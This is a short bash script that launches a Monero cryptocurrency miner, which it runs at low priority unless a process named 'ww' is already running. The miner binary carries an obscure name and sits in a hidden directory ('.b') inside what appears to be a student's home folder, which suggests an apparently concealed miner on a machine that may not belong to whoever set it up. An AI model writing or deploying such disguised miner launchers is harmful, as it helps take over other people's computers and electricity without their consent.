#!/bin/bash
if ! pidof ww >/dev/null; then
  nice /home/etudiant1/.b/ww $*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall ww\" or \"sudo killall ww\" if you want to remove background miner first."
fi

